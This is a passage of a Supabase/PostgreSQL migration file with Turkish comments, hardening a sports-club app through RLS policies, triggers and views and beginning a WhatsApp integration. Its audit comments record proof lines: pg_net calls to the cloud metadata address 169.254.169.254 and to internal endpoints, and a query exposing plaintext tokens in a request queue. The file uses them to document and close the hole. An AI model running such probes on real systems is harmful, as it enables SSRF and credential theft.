  -- (src/components/HesabiSil.tsx "KULÜPTE KALACAKLAR" listesi).

  -- --- Giriş hesabı --------------------------------------------------------
  delete from auth.users where id = v_id;
end;
$$;

revoke execute on function public.hesabimi_sil() from public;
revoke execute on function public.hesabimi_sil() from anon;
grant  execute on function public.hesabimi_sil() to authenticated;


-- ===========================================================================
-- 4) GÖZLEM — ANTRENÖR KENDİ ÜCRET ALANLARINI DEĞİŞTİREBİLİYOR
-- ===========================================================================
-- 0036'dan sonra bireysel_antrenor.tek_fiyat / paket_fiyat / paket_ders_sayisi
-- YETKİLİ PARA KAYNAĞI hâline geldi: rezervasyon tutarı oradan yazılıyor.
-- Ama "antrenör kendi kaydını günceller" politikası kolon dondurmuyordu.
-- Antrenör paket_ders_sayisi = 1 yazarsa sonraki her paket dersi bir paketin
-- TAMAMI kadar kaydedilir ve hakedişine öyle girer.
--
-- protect_profile_role deseninin aynısı; SECURITY INVOKER olması ŞART:
-- SECURITY DEFINER olsaydı gövdedeki current_user çağıranı değil sahibini
-- verirdi ve koşul hiç tutmazdı (0036'da tam olarak bu hata yapıldı).
create or replace function public.protect_antrenor_ucret()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  -- 0040: coalesce ŞART. Çıplak  ifadesi, profil satırı
  -- okunamayan bir authenticated kullanıcı için NULL üretiyor; NULL da koşulu
  -- yanlış yapıp kontrolü TAMAMEN ATLATIYORDU. Aynı desen protect_bireysel_rezervasyon'da.
  if current_user = 'authenticated'
     and coalesce(private.current_profile_role()::text, '') <> 'yonetici' then
    if new.tek_fiyat is distinct from old.tek_fiyat
       or new.paket_fiyat is distinct from old.paket_fiyat
       or new.paket_ders_sayisi is distinct from old.paket_ders_sayisi
       -- 0040: VİTRİN ALANLARI DA YÖNETİCİNİN TEKELİNDE. puan, veliye antrenör
       -- seçtirilen ekranda gösteriliyor ve hiçbir yerde sunucu tarafında
       -- türetilmiyor; antrenörün kendi yazdığı değer "kulübün verdiği puan"
       -- gibi görünüyordu. Ölçüldü: puan=5.0, deneyim_yil=30 geçiyordu.
       or new.puan is distinct from old.puan
       or new.deneyim_yil is distinct from old.deneyim_yil then
      raise exception 'Ücret, puan ve deneyim bilgisini yalnızca kulüp yöneticisi değiştirebilir.';
    end if;
  end if;
  return new;
end;
$$;

drop trigger if exists on_bireysel_antrenor_ucret on public.bireysel_antrenor;
create trigger on_bireysel_antrenor_ucret
  before update on public.bireysel_antrenor
  for each row execute procedure public.protect_antrenor_ucret();


-- ===========================================================================
-- 5) GÖZLEM — ANON BAŞVURUDA durum / kulup_id YAZABİLİYOR
-- ===========================================================================
-- kulup_basvurusu INSERT politikası `with check (true)` idi: kimliksiz biri
-- durum='onaylandi' ve gerçek bir kulup_id yazabiliyordu. Konsolda "zaten
-- onaylanmış" görünen sahte başvuru, sosyal mühendislik yüzeyi.
drop policy if exists "kulup_basvurusu: herkes başvuru gönderir" on public.kulup_basvurusu;
create policy "kulup_basvurusu: herkes başvuru gönderir" on public.kulup_basvurusu for insert
  with check (
    durum = 'yeni'
    and kulup_id is null
    and platform_notu is null
  );




-- ===========================================================================
-- 16) GÖRÜNÜMLER
--     Kaynak: 0027
-- ===========================================================================
-- Sporcu başına katılım özeti. Mobil antrenör ekranı yüzdeyi buradan alıyor;
-- eskiden tüm kadronun tüm yoklama geçmişini çekip JavaScript'te hesaplıyordu ve
-- PostgREST'in 1000 satır sınırı aşıldığında sessizce yanlış sonuç üretiyordu
-- (satır sayısı kadroyla değil ZAMANLA büyüyor).
--
-- security_invoker = on ZORUNLU: görünüm çağıranın yetkileriyle çalışır, yani
-- alttaki yoklama tablosunun 9 permissive politikası ve "kulup izolasyonu"
-- restrictive kiracı duvarı aynen geçerli olur. Varsayılan davranışta görünüm
-- SAHİBİNİN yetkisiyle koşar ve tüm kulüplerin yoklamasını sızdırırdı.
create or replace view public.sporcu_yoklama_ozet
with (security_invoker = on) as
select
  y.sporcu_id,
  count(*)::int                                    as toplam,
  count(*) filter (where y.durum = 'katildi')::int as katildi
from public.yoklama y
where y.durum is not null   -- işaretlenmemiş satır yüzdeyi düşürmesin
group by y.sporcu_id;

comment on view public.sporcu_yoklama_ozet is
  'Sporcu başına katılım toplamı (0027). security_invoker=on → alttaki yoklama tablosunun RLS''i ve kiracı duvarı aynen geçerlidir.';

grant select on public.sporcu_yoklama_ozet to authenticated;


-- 0033: efektif ödeme durumu (gecikme hesaplanır, kolona yazılmaz).
create or replace view public.odeme_gorunum
with (security_invoker = on) as
select
  o.*,
  -- Efektif durum: ödenmişse ödenmiş; son ödeme tarihi geçmiş ve hâlâ
  -- bekliyorsa gecikmiş. son_odeme_tarihi NULL ise (tarihi belirlenmemiş
  -- tahakkuk) gecikme hesaplanamaz, 'bekliyor' kalır.
  case
    when o.durum = 'odendi' then 'odendi'
    when o.durum = 'bekliyor' and o.son_odeme_tarihi is not null
         and o.son_odeme_tarihi < current_date then 'gecikti'
    else o.durum
  end as efektif_durum,
  -- Kaç gün gecikti (yaşlandırma raporu için). Gecikmemişse 0.
  case
    when o.durum = 'bekliyor' and o.son_odeme_tarihi is not null
         and o.son_odeme_tarihi < current_date
    then (current_date - o.son_odeme_tarihi)
    else 0
  end as gecikme_gun
from public.odeme o;

comment on view public.odeme_gorunum is
  'Ödeme + efektif_durum (gecikti hesaplanır, yazılmaz) + gecikme_gun (0033). security_invoker=on → odeme tablosunun RLS''i aynen geçerli. Gecikme zamanın geçmesidir; kolon güncellemek her gün çalışan bir iş gerektirirdi.';

grant select on public.odeme_gorunum to authenticated;




-- 0033: veli yayınlanmış maç kadrosunda kendi çocuğunu görür.
drop policy if exists "mac_kadro: veli yayınlanmış kadroyu görür" on public.mac_kadro;
create policy "mac_kadro: veli yayınlanmış kadroyu görür" on public.mac_kadro for select
  using (
    mac_kadro.yayinlandi
    and exists (
      select 1
        from public.etkinlik e
        join public.sporcular s on s.grup_id = e.grup_id
        join public.veli_sporcu vs on vs.sporcu_id = s.id
       where e.id = mac_kadro.etkinlik_id
         and vs.veli_id = auth.uid()
    )
  );

-- Veli kadro SATIRLARINDAN yalnızca KENDİ ÇOCUĞUNUNKİNİ görür.
-- Tüm kadroyu göstermek başka velilerin çocuklarının seçilip seçilmediğini
-- ifşa ederdi — kulüp içi bir hassasiyet ve gereksiz bir veri paylaşımı.
drop policy if exists "mac_kadro_sporcu: veli kendi çocuğunu görür" on public.mac_kadro_sporcu;
create policy "mac_kadro_sporcu: veli kendi çocuğunu görür" on public.mac_kadro_sporcu for select
  using (
    exists (
      select 1 from public.veli_sporcu vs
       where vs.sporcu_id = mac_kadro_sporcu.sporcu_id
         and vs.veli_id = auth.uid()
    )
    and exists (
      select 1 from public.mac_kadro mk
       where mk.id = mac_kadro_sporcu.mac_kadro_id
         and mk.yayinlandi
    )
  );





-- ===========================================================================
-- Kurulum sonu. Gövde doğrulaması tekrar açılıyor.
-- ===========================================================================
reset check_function_bodies;

-- Doğrulama sorguları (elle çalıştırılabilir):
--   select count(*) from pg_tables where schemaname = 'public';          -- 50
--   select count(*) from pg_policies where schemaname = 'public';        -- 225
--     (168 permissive + 57 restrictive)
--
--   -- 0024/0025 entegrasyonu: 4 kolon + 3 indeks + 1 trigger dönmeli
--   select table_name, column_name from information_schema.columns
--    where table_schema='public' and table_name in ('sporcular','grup')
--      and column_name in ('aktif','pasif_tarihi') order by 1, 2;
--   select indexname from pg_indexes where schemaname='public'
--    and indexname in ('sporcular_kulup_aktif_idx','grup_kulup_aktif_idx',
--                      'etkinlik_sonuc_bekleyen_idx');
--   select tgname from pg_trigger where tgrelid = 'public.etkinlik'::regclass
--    and not tgisinternal;                       -- on_etkinlik_sonuc_protect
--
--   -- kulup_id taşıyan tablo sayısı → 46 (47 tablo eksi kulup'un kendisi)
--   select count(*) from information_schema.columns
--    where table_schema = 'public' and column_name = 'kulup_id';
--
--   -- RLS'siz tablo var mı? → boş dönmeli
--   select tablename from pg_tables t where schemaname='public'
--     and not exists (select 1 from pg_class c join pg_namespace n on n.oid=c.relnamespace
--                     where n.nspname='public' and c.relname=t.tablename and c.relrowsecurity);
--
--   -- Restrictive politikaların hiçbirine rol atanmamış olmalı ({public})
--   select tablename, roles from pg_policies
--    where schemaname='public' and permissive = 'RESTRICTIVE' and roles <> '{public}';
--    → boş dönmeli
--
-- ===========================================================================
-- WHATSAPP ENTEGRASYONU  (kaynak: 0042 + 0043 + 0044)
-- ===========================================================================
-- Üç migration BİRLİKTE işleniyor ve SIRASI ÖNEMLİ:
--   0043 tabloları ve motoru kurar; 0044 o motorun iç fonksiyonlarının EXECUTE
--   iznini geri alır. 0044 atlanırsa YENİ kurulan her kulüpte, giriş yapmış
--   herhangi bir velinin kulübün doğrulanmış WhatsApp numarasından mesaj
--   gönderebildiği KRİTİK açık açık kalır (0044 başlığında ölçümüyle yazılı).
--
-- 0042 (pg_net kilidi) burada da deneniyor ama Supabase'de izinleri
-- supabase_admin verdiği için etkisiz kalabilir — dosya bunu ölçüp uyarıyor.
--
-- ⚠ BU BLOK, dosya sonundaki TRUNCATE revoke bloğundan ÖNCE durmalı: kendi
--   grant satırlarını içeriyor ve revoke en sonda kalmazsa TRUNCATE geri gelir.
-- ===========================================================================

-- ===========================================================================
-- 0042 — pg_net açığı: giriş yapmış her kullanıcı sunucudan HTTP isteği atabiliyor
-- ===========================================================================
-- WhatsApp entegrasyonunun (0043) hazırlığı sırasında ölçüldü. WhatsApp'la
-- SEBEP olarak ilgisi yok — bu açık ŞU AN mevcut ve bağımsız bir sorun.
--
-- BULGU
--   `pg_net` uzantısı kurulu (Supabase varsayılanı). `net` şeması ve
--   `net.http_post / http_get / http_delete` fonksiyonları `anon` ve
--   `authenticated` rollerine AÇIKÇA verilmiş durumda. Yani en düşük yetkili
--   gerçek kullanıcı — bir VELİ — kendi JWT'siyle veritabanına istediği adrese
--   HTTP isteği attırabiliyor.
--
-- ÖLÇÜLDÜ (veli JWT'si, yerel Docker):
--   select net.http_post('http://127.0.0.1:54321/rest/v1/', '{"deneme":1}');  → 17
--   select net.http_get('http://169.254.169.254/latest/meta-data/');          → 18
--   select count(*) from net._http_response;   → 1 satır GÖRÜNÜYOR
--   Yani yanıt gövdesi de okunabiliyor: körlemesine değil, TAM SSRF.
--
-- NEDEN CİDDİ
--   · İstek VERİTABANI SUNUCUSUNDAN çıkıyor — ağın içinden. Dışarıya kapalı iç
--     servisler ve bulut metadata uçları bu yolla erişilebilir hâle geliyor.
--   · Kullanıcı okuyabildiği her veriyi kendi sunucusuna POST edebilir. RLS
--     okumayı sınırlar, okunanı dışarı taşımayı sınırlamaz.
--   · `net._http_response` PAYLAŞILAN bir tablo. 0043 ile WhatsApp trafiği de
--     buradan geçecek; kapatılmazsa bir veli kulübün WhatsApp API yanıtlarını
--     (mesaj kimlikleri, başka velilerin numaraları) okuyabilir.
--
--   Supabase'in barındırdığı ortamda metadata ucunun GERÇEKTEN erişilebilir olup
--   olmadığı ağ yapılandırmasına bağlı ve DOĞRULANMADI. Ama yetenek nettir;
--   erişilemezliğe bel bağlamak savunma değildir.
--
--
-- ⚠⚠ BU MIGRATION TEK BAŞINA YETMEYEBİLİR — OKU ⚠⚠
--
--   İzinleri `supabase_admin` verdi. PostgreSQL'de bir izni yalnızca onu VEREN
--   (ya da nesnenin sahibi / bir superuser) geri alabilir.
--
--   YERELDE ÖLÇÜLDÜ:
--     select rolname, rolsuper from pg_roles where rolname='postgres';
--       → postgres | f            (superuser DEĞİL)
--     set role supabase_admin;
--       → ERROR: permission denied to set role "supabase_admin"
--     revoke usage on schema net from authenticated;
--       → WARNING: no privileges could be revoked for "net"
--
--   Supabase SQL Editor `postgres` olarak çalışır. Dolayısıyla yerel kurulumda
--   bu revoke ETKİSİZ kalıyor. Barındırılan projede `postgres` rolüne farklı
--   üyelikler verilmiş olabilir — orada çalışabilir. Migration bunu DENER,
--   sonucu ÖLÇER ve gerçeği söyler; başarısız olursa hata fırlatıp zinciri
--   durdurmaz (bu bir platform izni sorunu, şema hatası değil).
--
--   CANLIDA DURUMU GÖRMEK İÇİN (SQL Editor'da çalıştır):
--     select has_schema_privilege('authenticated','net','USAGE')      as sema,
--            has_table_privilege('authenticated','net._http_response','SELECT') as yanit_tablosu;
--     -- ikisi de false ise sorun yok; true varsa aşağıdaki nota bak.
--
--   REVOKE ÇALIŞMAZSA NE YAPILMALI
--     1. Supabase destek talebi aç: "pg_net'in anon/authenticated rollerine
--        verilen erişimini kaldırmak istiyoruz" de. Bu, projeye özel bir
--        yapılandırma talebi ve destek tarafından yapılabiliyor.
--     2. Bu arada 0043'ün gönderim motoru zaten GÜVENLİ: pg_net'i yalnızca
--        SECURITY DEFINER fonksiyonlar içinden, sahibinin (postgres) yetkisiyle
--        çağırıyor. İstemci hiçbir zaman doğrudan `net.*` çağırmıyor. Yani
--        WhatsApp entegrasyonu bu açığı BÜYÜTMÜYOR — ama açık kapanana kadar
--        pg_net kaynaklı SSRF riski (0043'ten bağımsız olarak) devam ediyor.
--
-- ÇALIŞTIRMA: 0041'den sonra, 0043'ten önce. Tekrar çalıştırılabilir.
-- ===========================================================================

do $$
declare
  v_sema  boolean;
  v_fonk  boolean;
  v_tablo boolean;
begin
  if not exists (select 1 from pg_namespace where nspname = 'net') then
    raise notice '0042: pg_net kurulu değil, yapılacak bir şey yok.';
    return;
  end if;

  -- DENEME. Her biri ayrı ayrı sarmalanıyor: biri yetki hatası verirse
  -- diğerleri yine de denensin.
  begin execute 'revoke all on schema net from public, anon, authenticated';                exception when others then null; end;
  begin execute 'revoke all on all functions in schema net from public, anon, authenticated'; exception when others then null; end;
  begin execute 'revoke all on all tables    in schema net from public, anon, authenticated'; exception when others then null; end;
  begin execute 'alter default privileges in schema net revoke all on functions from public, anon, authenticated'; exception when others then null; end;
  begin execute 'alter default privileges in schema net revoke all on tables    from public, anon, authenticated'; exception when others then null; end;

  -- ÖLÇÜM — "denedim" demek yetmez, sonucu görmek gerekir.
  v_sema  := has_schema_privilege('authenticated', 'net', 'USAGE');
  v_fonk  := has_function_privilege('authenticated',
               'net.http_post(text,jsonb,jsonb,jsonb,integer)', 'EXECUTE');
  v_tablo := has_table_privilege('authenticated', 'net._http_response', 'SELECT');

  if v_sema or v_fonk or v_tablo then
    raise warning E'\n'
      '========================================================================\n'
      '0042 — pg_net ERİŞİMİ KAPATILAMADI (şema=%, fonksiyon=%, tablo=%)\n'
      '------------------------------------------------------------------------\n'
      'Sebep: izinleri supabase_admin verdi; bu oturumun rolü (%) onları geri\n'
      'alamıyor. Bu bir ŞEMA HATASI DEĞİL, platform izni sınırı — migration\n'
      'zinciri durdurulmuyor.\n'
      'Yapılacak: Supabase destek talebiyle pg_net erişiminin anon/authenticated\n'
      'rollerinden kaldırılmasını iste. Ayrıntı için bu dosyanın başlığına bak.\n'
      '========================================================================',
      v_sema, v_fonk, v_tablo, current_user;
  else
    raise notice '0042 tamam: net şeması anon/authenticated''a kapatıldı.';
  end if;

  -- service_role sunucu tarafı bir bakım yolu için açık kalsın (zaten RLS'i
  -- baypas eden platform rolü). Yetki yoksa sessizce geçiliyor.
  begin execute 'grant usage on schema net to service_role';                exception when others then null; end;
  begin execute 'grant execute on all functions in schema net to service_role'; exception when others then null; end;
end $$;


-- ===========================================================================
-- 0043 — WhatsApp Cloud API entegrasyonu (şema + gönderim motoru)
-- ===========================================================================
-- KARAR: her kulüp KENDİ WhatsApp Business numarasını bağlar. Veli mesajı
-- "Karşıyaka Spor Okulu"ndan görür, "Spor Coach"tan değil. Bu, tek platform
-- numarasına göre daha zahmetli ama doğru olan: kulübün markası korunur ve bir
-- kulübün kötü kullanımı diğerlerinin teslim kalitesini düşürmez.
--
-- ===========================================================================
-- MİMARİNİN ÜÇ TAŞIYICI KARARI
-- ===========================================================================
--
-- 1) JETON UYGULAMA KODUNA UĞRAMAZ — AMA VERİTABANI İÇİNDE AÇIKTA.
--
--    ⚠⚠ BU MADDE ÖNCE YANLIŞ YAZILDI. "Ne mobil uygulama, ne panel, ne de kulüp
--    yöneticisi jetonu görebilir" deniyordu. Birinci yarısı doğru, ikinci yarısı
--    YANLIŞ. Denetim turu buldu, bağımsız olarak doğrulandı:
--
--      set local role authenticated;          -- sıradan bir VELİ
--      select count(*) from net.http_request_queue
--       where headers::text like '%EAAG_...%';
--        → 1 satırda jeton GÖRÜNÜYOR
--
--    Vault tarafı sağlam: `select * from vault.decrypted_secrets` authenticated
--    için "permission denied for schema vault" veriyor. Ama jeton Vault'tan
--    çıkıp Meta'ya giderken `net.http_post` onu Authorization başlığıyla
--    `net.http_request_queue` tablosuna DÜZ METİN yazıyor ve o tablonun PUBLIC
--    izni var. Kiracı ayrımı da yok: bir kulübün velisi TÜM kulüplerin jetonunu
--    görebiliyor.
--
--    BUGÜN API'DEN ULAŞILAMIYOR: PostgREST yalnızca public ve graphql_public
--    şemalarını yayınlıyor, `net` listede değil (Accept-Profile: net → 406).
--    Yani duvar ŞEMADA DEĞİL, PostgREST AYARINDA — TEK KATMAN. "Exposed
--    schemas" listesine bir gün `net` eklenirse anında kritik olur.
--
--    VERİTABANI İÇİNDEN KAPATILAMIYOR (ölçüldü): izinleri supabase_admin verdi,
--    `postgres` superuser değil (rolsuper = f) ve supabase_admin üyesi değil;
--    revoke, alter owner ve enable rls üçü de reddediliyor. 0048 YAZMA yolunu
--    tetikleyiciyle kapattı, OKUMA açık kaldı.
--
--    KALICI ÇÖZÜM: gönderimi Edge Function'a taşımak — jeton hiç `net.*`'a
--    uğramaz. Bu, aşağıdaki mimarinin değişmesi demek ve ayrı bir iş olarak
--    planlanmalı. O zamana kadar risk yukarıdaki tek katmana bağlı.
--
-- 2) pg_net ASENKRON VE TRANSACTION'LIDIR.
--    `net.http_post` bir `bigint` request_id döner; yanıt SONRA
--    `net._http_response` tablosuna düşer (TTL 6 saat). Ayrıca istek ancak
--    COMMIT olursa gider — ROLLBACK'te hiç gitmez.
--    Bu yüzden gönderim TEK ADIMDA OLAMAZ. Zincir:
--      kuyruğa al → gönder (request_id sakla) → yanıtı eşleştir → webhook ile teslim
--    "Gönderdim" demek "ulaştı" demek değildir; durum alanı bu ikisini ayırır.
--
-- 3) TEKİLLEŞTİRME ZORUNLU.
--    ÖLÇÜLDÜ (demo veri): 22 aktif sporcu → 13 tekil veli numarası. Veliler
--    birden fazla çocukla kayıtlı. Tekilleştirilmezse aynı duyuru aynı veliye
--    2-3 kez gider: Meta her birini ayrı ücretlendirir VE tekrar eden gönderim
--    numaranın kalite derecesini düşürür. Kalite düşünce kulübün günlük mesaj
--    limiti kısılır — yani spam, kulübün kendi ulaşabilirliğini yakar.
--
-- ÇALIŞTIRMA: 0042'den sonra. Tekrar çalıştırılabilir.
-- ===========================================================================

-- pg_cron ZORUNLU DEĞİL: yalnızca `postgres` veritabanında kurulabiliyor ve
-- bazı ortamlarda hiç bulunmuyor. Sarmalanmasaydı tek bir hata KURULUM
-- PAKETİNİN TAMAMINI durdururdu — WhatsApp tabloları ve (daha kötüsü) 0044'ün
-- izin revoke'ları hiç çalışmaz, yeni kulüp açık şemayla kalırdı.
-- Cron yoksa şema yine kurulur; kuyruk boşaltma o zaman dışarıdan tetiklenir.
do $cronblok$
begin
  begin
    execute 'create extension if not exists pg_cron';
  exception when others then
    raise warning 'pg_cron kurulamadı (%). Şema kuruldu ama kuyruk otomatik boşaltılmayacak; private.wa_gonder() ve private.wa_yanit_isle() dışarıdan çağrılmalı.', sqlerrm;
  end;
end $cronblok$;


-- ===========================================================================
-- 1) TELEFON NORMALLEŞTİRME
-- ===========================================================================
-- ÖLÇÜLDÜ: telefon YALNIZCA `sporcular.veli_telefon`'da var (22/22 dolu);
-- `profiles.telefon` tamamen boş (0/4). Format yerel ve serbest:
-- "0536 802 93 15". Meta ise ülke kodlu, işaretsiz istiyor: "905368029315".
--
-- GEÇERSİZ NUMARA GÖNDERMEK ZARARLIDIR: Meta başarısız gönderimi numaranın
-- KALİTE DERECESİNE yazar. Bu yüzden fonksiyon "temizle ve yolla" değil,
-- "emin değilsen NULL dön" diyor — göndermemek, yanlış göndermekten iyidir.
create or replace function private.telefon_e164(p_ham text)
returns text
language plpgsql
immutable
set search_path = ''
as $$
declare v text;
begin
  if p_ham is null then return null; end if;

  v := regexp_replace(p_ham, '[^0-9]', '', 'g');   -- boşluk, (), -, +, . atılır

  if v like '00%' then v := substring(v from 3); end if;              -- 0090… → 90…
  if length(v) = 11 and v like '0%' then v := substring(v from 2); end if;  -- 0536… → 536…

  -- Türkiye cep numarası ülke kodsuz 10 hanedir ve HER ZAMAN 5 ile başlar.
  -- 5 ile başlamıyorsa sabit hattır; WhatsApp göndermenin anlamı yok.
  if length(v) = 10 and v like '5%' then v := '90' || v; end if;

  if length(v) = 12 and v like '905%' then return v; end if;

  return null;   -- eksik hane, yabancı numara, sabit hat, bozuk kayıt
end;
$$;


-- ===========================================================================
-- 2) KİRACI BAŞINA HESAP — JETON HARİÇ
-- ===========================================================================
create table if not exists public.wa_hesap (
  kulup_id            uuid primary key references public.kulup(id) on delete cascade,
  waba_id             text not null,
  telefon_numarasi_id text not null,          -- Meta'nın PHONE_NUMBER_ID'si
  gorunen_numara      text not null,          -- panelde gösterim için, E.164
  isletme_adi         text,
  aktif               boolean not null default false,
  -- Meta'nın verdiği kalite derecesi ve günlük benzersiz alıcı limiti.
  -- Sağlık kontrolü günde bir kez tazeliyor; panelde gösterilerek kulüp
  -- kendi limitini görebiliyor.
  kalite_derecesi     text,
  gunluk_limit        int,
  son_kontrol         timestamptz,
  -- Jeton geçersizleşince (Meta hata 190/200) buraya sebep yazılıp aktif=false
  -- yapılıyor: o kulübün kuyruğu durur, DİĞER kulüplerinki akmaya devam eder.
  devre_disi_sebep    text,
  created_at          timestamptz not null default now()
);

comment on table public.wa_hesap is
  'Kulübün WhatsApp Business bağlantısı. Erişim jetonu BURADA DEĞİL — private.wa_gizli + Vault.';

-- Jeton ayrı şemada. `private` PostgREST'e açık değil, yani hiçbir API isteği
-- bu tabloya ulaşamaz; kulüp yöneticisi de göremez.
create table if not exists private.wa_gizli (
  kulup_id  uuid primary key references public.kulup(id) on delete cascade,
  -- Vault'taki sırrın kimliği. Jetonun kendisi burada da DURMUYOR.
  secret_id uuid not null
);


-- ===========================================================================
-- 3) ŞABLONLAR
-- ===========================================================================
-- Meta, işletmenin başlattığı her mesajın ÖNCEDEN ONAYLI bir şablon olmasını
-- şart koşuyor. Serbest metin yalnızca kullanıcının son mesajından sonraki 24
-- saat içinde mümkün.
--
-- KATEGORİ KİLİTLİ TUTULUYOR: utility şablonu pazarlama amaçlı kullanmak hem
-- Meta cezası hem 6563 sayılı kanun açısından sorun. Kategoriyi panelden
-- serbest bırakmak, kulübün farkında olmadan ihlale düşmesine yol açardı.
create table if not exists public.wa_sablon (
  id              uuid primary key default gen_random_uuid(),
  kulup_id        uuid not null default private.current_kulup_id() references public.kulup(id) on delete cascade,
  ad              text not null,              -- Meta'daki şablon adı (snake_case)
  kategori        text not null check (kategori in ('utility', 'marketing', 'authentication')),
  dil             text not null default 'tr',
  degisken_sayisi int  not null default 0,
  durum           text not null default 'beklemede'
                    check (durum in ('beklemede', 'onaylandi', 'reddedildi', 'duraklatildi')),
  -- Meta bir şablonu kalite düşüklüğü nedeniyle geçici durdurabiliyor (132015/132016).
  -- O sırada SADECE o şablonun kuyruğu donuyor, diğerleri akıyor.
  duraklatma_bitis timestamptz,
  created_at      timestamptz not null default now(),
  constraint wa_sablon_kulup_ad_uniq unique (kulup_id, ad, dil)
);


-- ===========================================================================
-- 4) ONAY (OPT-IN) — KVKK + Meta politikası
-- ===========================================================================
-- Meta'nın kendi kuralı, Türkiye mevzuatından BAĞIMSIZ olarak, alıcının
-- onayının belgelenmiş olmasını istiyor. KVKK tarafında ise aydınlatma
-- yükümlülüğü var. İkisi de "kim, ne zaman, neyi kabul etti" kaydını gerektiriyor.
--
-- ⚠ HUKUKİ NİTELENDİRME BU DOSYANIN İŞİ DEĞİL. "Aidatınız gecikti" gibi
--   hizmetin ifasına ilişkin mesajlarla "yaz kampı kayıtları başladı" gibi
--   tanıtım mesajları farklı rejimlere tabi olabilir (6563 sayılı kanun,
--   İYS). Şema bu ayrımı TAŞIYOR (`tur` + şablon kategorisi) ki kulüp doğru
--   kararı verebilsin; kararı vermiyor.
create table if not exists public.wa_onay (
  id           uuid primary key default gen_random_uuid(),
  kulup_id     uuid not null default private.current_kulup_id() references public.kulup(id) on delete cascade,
  telefon      text not null,               -- E.164, private.telefon_e164 çıktısı
  durum        text not null default 'onayli'
                 check (durum in ('onayli', 'reddedildi', 'whatsapp_yok')),
  kaynak       text,                        -- onayın nereden alındığı (kayıt formu, sözleşme…)
  guncelleme   timestamptz not null default now(),
  constraint wa_onay_kulup_telefon_uniq unique (kulup_id, telefon)
);

comment on column public.wa_onay.durum is
  'whatsapp_yok: Meta 131026 döndü — numara WhatsApp kullanmıyor. Tekrar denemek kalite derecesini boşuna düşürür.';


-- ===========================================================================
-- 5) GİDEN KUTUSU
-- ===========================================================================
-- Neden kuyruk: pg_net asenkron ve transaction'lı. Mobil uygulama duyuru
-- gönderirken HTTP isteğini bekleyemez; ayrıca istek COMMIT'e bağlı olduğu için
-- "kuyruğa yaz, cron gönderir" deseni hem doğru hem dayanıklı.
create table if not exists public.wa_giden (
  id              uuid primary key default gen_random_uuid(),
  kulup_id        uuid not null default private.current_kulup_id() references public.kulup(id) on delete cascade,
  tur             text not null check (tur in ('duyuru', 'aidat', 'antrenman', 'davet')),
  kaynak_tablo    text,
  kaynak_id       uuid,
  sablon_ad       text not null,
  parametreler    jsonb not null default '[]'::jsonb,   -- {{1}}, {{2}} sırayla
  alici_telefon   text not null,
  alici_sporcu_id uuid,

  durum           text not null default 'bekliyor'
                    check (durum in ('bekliyor', 'gonderildi', 'kabul_edildi', 'basarisiz', 'iptal')),
  istek_id        bigint,                    -- net.http_post'un döndürdüğü id
  wamid           text,                      -- Meta'nın mesaj kimliği
  gonderim_zamani timestamptz,
  deneme          int not null default 0,
  sonraki_deneme  timestamptz,
  hata_kodu       int,
  hata_metni      text,

  -- Webhook'tan gelen teslim bilgisi. 'gonderildi' Meta'nın isteği KABUL
  -- ettiği andır; teslim edildiği an DEĞİL. İkisini ayırmak, "gönderdim ama
  -- ulaşmadı" durumunu görünür kılıyor.
  teslim_durumu   text check (teslim_durumu in ('sent', 'delivered', 'read', 'failed')),
  teslim_zamani   timestamptz,

  created_at      timestamptz not null default now()
);

create unique index if not exists wa_giden_istek_uniq on public.wa_giden (istek_id) where istek_id is not null;
create unique index if not exists wa_giden_wamid_uniq on public.wa_giden (wamid)    where wamid    is not null;
create index if not exists wa_giden_kuyruk_idx on public.wa_giden (durum, coalesce(sonraki_deneme, created_at))
  where durum = 'bekliyor';
create index if not exists wa_giden_kulup_idx on public.wa_giden (kulup_id, created_at desc);


-- ===========================================================================
-- 6) GÜNLÜK BENZERSİZ ALICI SAYACI
-- ===========================================================================
-- Meta'nın limiti "günde kaç mesaj" değil, "24 saatte kaç BENZERSİZ ALICI".
-- Yeni bir numara 250 ile başlıyor. 22 sporculu kulüpte sorun değil; 250+
-- velili bir kulüpte ilk toplu duyuruda duvara toslanır ve kalan mesajlar
-- sessizce başarısız olur. Sayaç bunu önceden görünür kılıyor.
create table if not exists public.wa_gunluk_sayac (
  kulup_id uuid not null references public.kulup(id) on delete cascade,
  gun      date not null default current_date,
  telefon  text not null,
  primary key (kulup_id, gun, telefon)
);


-- ===========================================================================
-- 7) WEBHOOK OLAYLARI
-- ===========================================================================
-- Meta aynı olayı 7 gün boyunca tekrar gönderebilir ve SIRA GARANTİSİ YOKTUR
-- ('read' önce, 'delivered' sonra gelebilir). Bu yüzden hem tekrar koruması
-- (unique) hem de durum derecesi (sent<delivered<read) gerekiyor.
create table if not exists public.wa_olay (
  id         uuid primary key default gen_random_uuid(),
  wamid      text not null,
  durum      text not null,
  hata_kodu  int,
  ham        jsonb,
  created_at timestamptz not null default now(),
  constraint wa_olay_wamid_durum_uniq unique (wamid, durum)
);


-- ===========================================================================
-- 8) DUYURUYA WHATSAPP BAYRAĞI
-- ===========================================================================
-- ⚠ `sms_ile` YENİDEN KULLANILMIYOR. O kolon "SMS" anlamına geliyor ve üç ayrı
--   panel yüzeyi metnini ona göre yazmış durumda. Anlamını değiştirmek, ekranda
--   "SMS gönderildi" yazarken WhatsApp gönderilmesine yol açardı — bu projenin
--   tam olarak temizlediği yanıltıcı yüzey sınıfı.
alter table public.duyuru add column if not exists whatsapp_ile boolean not null default false;


-- ===========================================================================
-- 9) İZİNLER VE RLS
-- ===========================================================================
-- ⚠ YENİ TABLO = YENİ GRANT. 01_sema.sql'in toplu grant'ı yalnızca o an var
--   olan tablolara uygulanır; bu migration kendi iznini vermek zorunda.
--   (Aynı hata daha önce `engelleme` tablosunda yaşandı: politikalar doğruydu
--   ama "permission denied for table" alınıyordu.)
grant select, insert, update, delete on public.wa_hesap, public.wa_sablon, public.wa_onay,
  public.wa_giden, public.wa_gunluk_sayac, public.wa_olay to anon, authenticated, service_role;

-- 0042'nin gerekçesiyle aynı: grant all TRUNCATE'i de verirdi, RLS TRUNCATE'i
-- kapsamaz. Burada zaten dar bir liste verildi, yine de açıkça alınıyor.
revoke truncate on public.wa_hesap, public.wa_sablon, public.wa_onay,
  public.wa_giden, public.wa_gunluk_sayac, public.wa_olay from anon, authenticated;

alter table public.wa_hesap        enable row level security;
alter table public.wa_sablon       enable row level security;
alter table public.wa_onay         enable row level security;
alter table public.wa_giden        enable row level security;
alter table public.wa_gunluk_sayac enable row level security;
alter table public.wa_olay         enable row level security;

-- KİRACI DUVARI (restrictive). `to authenticated` BİLİNÇLİ OLARAK YOK:
